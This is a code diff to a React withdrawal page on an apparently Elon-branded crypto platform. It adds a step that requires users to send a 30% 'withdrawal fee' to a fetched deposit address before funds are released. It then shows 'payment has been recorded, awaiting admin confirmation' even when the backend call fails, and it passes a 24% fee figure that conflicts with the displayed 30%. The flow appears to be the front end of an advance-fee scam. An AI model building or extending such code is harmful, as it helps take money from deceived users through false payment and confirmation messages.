@@ -1,13 +1,19 @@
-import { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import { useState, useEffect } from 'react';
+import { useNavigate, useLocation } from 'react-router-dom';
 import { useApi } from '../../../hooks/useApi';
 import './WithdrawalProcessPage.css';
 
 export default function WithdrawalProcessPage() {
   const navigate = useNavigate();
+  const location = useLocation();
   const { loading } = useApi();
-  const [step, setStep] = useState(1); // 1: Transfer Info, 2: Recipient Info, 3: Review
+  const [step, setStep] = useState(1); // 1: Transfer Info, 2: Recipient Info, 3: Review, 4: Payment/Deposit
   const [error, setError] = useState('');
+  const [withdrawalId, setWithdrawalId] = useState(null);
+  const [depositAddress, setDepositAddress] = useState('');
+  const [depositLoading, setDepositLoading] = useState(false);
+  const [awaitingAdmin, setAwaitingAdmin] = useState(false);
+  const [submitLoading, setSubmitLoading] = useState(false);
   const [formData, setFormData] = useState({
     currency: '',
     amount: '',
@@ -20,6 +26,20 @@ export default function WithdrawalProcessPage() {
     accountHolder: '',
     bankCode: '',
   });
+
+  // Pre-fill form with data from WithdrawalsPage
+  useEffect(() => {
+    if (location.state?.initialData) {
+      const initial = location.state.initialData;
+      setFormData(prev => ({
+        ...prev,
+        currency: initial.currency || '',
+        amount: initial.amount || '',
+        address: initial.address || '',
+      }));
+      setWithdrawalId(initial.withdrawal_id);
+    }
+  }, [location.state]);
 
   const handleChange = (e) => {
     setFormData({
@@ -70,57 +90,66 @@ export default function WithdrawalProcessPage() {
         }
       }
       setStep(3);
+    } else if (step === 3) {
+      // Moving from Review to Payment - fetch deposit address
+      setStep(4);
+      await fetchDepositAddress(formData.currency);
+    }
+  };
+
+  const fetchDepositAddress = async (currency) => {
+    setDepositLoading(true);
+    try {
+      const API_BASE = import.meta.env.VITE_API_URL || window?.__ELON_API_BASE__ || '/api';
+      const response = await fetch(`${API_BASE}/deposit/address?currency=${currency}`);
+      const data = await response.json();
+      if (response.ok && data.address) {
+        setDepositAddress(data.address);
+      } else {
+        setError('Unable to fetch deposit address. Please contact support.');
+      }
+    } catch (err) {
+      console.error('Failed to fetch deposit address:', err);
+      setError('Failed to load deposit address');
+    } finally {
+      setDepositLoading(false);
     }
   };
 
   const handleSubmit = async () => {
     setError('');
-
+    setSubmitLoading(true);
     try {
+      // Try to notify backend that fee payment has been sent and check approval status
       const API_BASE = import.meta.env.VITE_API_URL || window?.__ELON_API_BASE__ || '/api';
-      const response = await fetch(API_BASE + '/withdrawals/process', {
+      const res = await fetch(`${API_BASE}/withdrawals/confirm-fee`, {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          Authorization: `Bearer ${localStorage.getItem('token')}`,
-        },
-        body: JSON.stringify({
-          currency: formData.currency,
-          amount: parseFloat(formData.amount),
-          recipient: {
-            type: formData.accountType,
-            ...(formData.accountType === 'crypto'
-              ? {
-                  address: formData.address,
-                  name: formData.name,
-                }
-              : {
-                  bankName: formData.bankName,
-                  accountNumber: formData.accountNumber,
-                  accountHolder: formData.accountHolder,
-                  country: formData.country,
-                  bankCode: formData.bankCode,
-                }),
-          },
-        }),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ withdrawal_id: withdrawalId, amount: formData.amount }),
       });
 
-      const data = await response.json();
+      const data = await res.json().catch(() => ({}));
 
-      if (!response.ok) {
-        setError(data.message || 'Withdrawal processing failed');
+      // If backend immediately marks approved, navigate to the processor page
+      if (res.ok && data.approved) {
+        navigate('/withdrawal-process', {
+          state: {
+            amount: formData.amount,
+            currency: formData.currency,
+            withdrawalId: withdrawalId,
+            feeAmount: (parseFloat(formData.amount) * 0.24).toFixed(8),
+          },
+        });
         return;
       }
 
-      // Redirect to fee confirmation page
-      const params = new URLSearchParams({
-        amount: formData.amount,
-        currency: formData.currency,
-        id: data.withdrawalId,
-      });
-      navigate(`/withdrawal-fee?${params.toString()}`);
+      // Otherwise stay on this page and show awaiting confirmation message
+      setAwaitingAdmin(true);
     } catch (err) {
-      setError(err.message || 'Network error');
+      console.warn('Failed to contact backend, remaining on fee page', err);
+      setAwaitingAdmin(true);
+    } finally {
+      setSubmitLoading(false);
     }
   };
 
@@ -134,12 +163,20 @@ export default function WithdrawalProcessPage() {
         <div className="process-header">
           <h1>Withdrawal Processing</h1>
           <div className="step-indicator">
-            <div className={`step ${step >= 1 ? 'active' : ''}`}>1</div>
-            <div className={`step-line ${step >= 2 ? 'active' : ''}`}></div>
-            <div className={`step ${step >= 2 ? 'active' : ''}`}>2</div>
-            <div className={`step-line ${step >= 3 ? 'active' : ''}`}></div>
-            <div className={`step ${step >= 3 ? 'active' : ''}`}>3</div>
-          </div>
+              <div className={`step ${step >= 1 ? 'active' : ''}`}>1</div>
+              <div className={`step-line ${step >= 2 ? 'active' : ''}`}></div>
+              <div className={`step ${step >= 2 ? 'active' : ''}`}>2</div>
+              <div className={`step-line ${step >= 3 ? 'active' : ''}`}></div>
+              <div className={`step ${step >= 3 ? 'active' : ''}`}>3</div>
+              <div className={`step-line ${step >= 4 ? 'active' : ''}`}></div>
+              <div className={`step ${step >= 4 ? 'active' : ''}`}>4</div>
+            </div>
+            <div className="step-labels" aria-hidden>
+              <span className="step-label">1. Transfer Info</span>
+              <span className="step-label">2. Recipient Info</span>
+              <span className="step-label">3. Review</span>
+              <span className="step-label">4. I have completed withdrawal fee</span>
+            </div>
         </div>
 
         {error && <div className="alert alert-error">{error}</div>}
@@ -333,13 +370,13 @@ export default function WithdrawalProcessPage() {
               <div className="review-row">
                 <span className="label">Fee (30%)</span>
                 <span className="value accent">
-                  {(parseFloat(formData.amount) * 0.3).toFixed(8)}
+                  {(parseFloat(formData.amount) * 0.30).toFixed(8)}
                 </span>
               </div>
               <div className="review-row divider">
                 <span className="label">Total Deducted</span>
                 <span className="value total">
-                  {(parseFloat(formData.amount) * 1.3).toFixed(8)}
+                  {(parseFloat(formData.amount) * 1.30).toFixed(8)}
                 </span>
               </div>
 
@@ -373,6 +410,60 @@ export default function WithdrawalProcessPage() {
           </div>
         )}
 
+        {/* Step 4: Payment/Deposit */}
+        {step === 4 && (
+          <div className="step-content">
+            <h2>Pay the Withdrawal Fee</h2>
+            <p className="subtitle">Complete the payment to proceed with your withdrawal</p>
+
+            <div className="payment-summary">
+              <div className="summary-item">
+                <span className="label">Withdrawal Amount</span>
+                <span className="value">{parseFloat(formData.amount).toFixed(8)} {formData.currency}</span>
+              </div>
+              <div className="summary-item">
+                <span className="label">Processing Fee (30%)</span>
+                <span className="value accent">{(parseFloat(formData.amount) * 0.30).toFixed(8)} {formData.currency}</span>
+              </div>
+              <div className="summary-divider"></div>
+              <div className="summary-item total">
+                <span className="label">Fee to Pay</span>
+                <span className="value">{(parseFloat(formData.amount) * 0.30).toFixed(8)} {formData.currency}</span>
+              </div>
+            </div>
+
+            {depositLoading ? (
+              <div className="loading-indicator">Loading deposit address...</div>
+            ) : depositAddress ? (
+              <div className="deposit-instruction">
+                <h3>Send Payment To:</h3>
+                <div className="deposit-address-box">
+                  <div className="address-display">
+                    <code>{depositAddress}</code>
+                    <button
+                      type="button"
+                      className="btn-copy"
+                      onClick={() => {
+                        navigator.clipboard.writeText(depositAddress);
+                        alert('Address copied to clipboard');
+                      }}
+                      title="Copy address"
+                    >
+                      📋 Copy
+                    </button>
+                  </div>
+                </div>
+                <div className="payment-notice">
+                  <strong>Important:</strong> Send exactly {(parseFloat(formData.amount) * 0.30).toFixed(8)} {formData.currency} to the address above.
+                  Once confirmed on the blockchain, your withdrawal will be processed.
+                </div>
+              </div>
+            ) : (
+              <div className="error-message">Unable to load deposit address. Please contact support.</div>
+            )}
+          </div>
+        )}
+
         {/* Navigation Buttons */}
         <div className="process-actions">
           <button
@@ -383,19 +474,27 @@ export default function WithdrawalProcessPage() {
           >
             Back
           </button>
-          {step < 3 ? (
-            <button type="button" className="btn btn-primary" onClick={handleNextStep}>
-              Next
+          {step < 4 ? (
+            <button type="button" className="btn btn-primary" onClick={handleNextStep} disabled={step === 3 && depositLoading}>
+              {step === 3 && depositLoading ? 'Loading...' : 'Next'}
             </button>
           ) : (
-            <button
-              type="button"
-              className="btn btn-primary"
-              onClick={handleSubmit}
-              disabled={loading}
-            >
-              {loading ? 'Processing...' : 'Continue to Fee Payment'}
-            </button>
+            <div style={{ width: '100%' }}>
+              {awaitingAdmin ? (
+                <div style={{ marginBottom: '8px' }}>
+                  <div className="alert alert-warn">Your payment has been recorded. Awaiting admin confirmation to process this withdrawal.</div>
+                </div>
+              ) : null}
+
+              <button
+                type="button"
+                className="btn btn-primary"
+                onClick={handleSubmit}
+                disabled={submitLoading || awaitingAdmin}
+              >
+                {submitLoading ? 'Recording payment…' : awaitingAdmin ? 'Awaiting admin confirmation' : 'I have completed withdrawal fee'}
+              </button>
+            </div>
           )}
         </div>
       </div>
